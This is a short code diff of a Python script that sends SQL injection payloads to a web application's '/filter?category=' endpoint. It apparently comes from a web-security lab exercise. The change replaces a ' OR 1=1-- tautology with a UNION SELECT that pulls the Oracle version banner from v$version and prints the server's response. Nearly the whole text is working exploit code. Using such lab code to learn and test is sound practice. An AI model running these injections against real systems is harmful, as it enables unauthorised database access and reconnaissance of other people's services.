@@ -10,6 +10,7 @@ if __name__ == "__main__":
         sys.exit(1)
 
 
-burp_url = sys.argv[1]+"/filter?category=' OR 1=1--"
+burp_url = sys.argv[1]+"/filter?category=' UNION SELECT BANNER, NULL FROM v$version--"
 burp_headers = {}
-requests.get(burp_url, headers=burp_headers)
+r = requests.get(burp_url, headers=burp_headers)
+print(r.text)
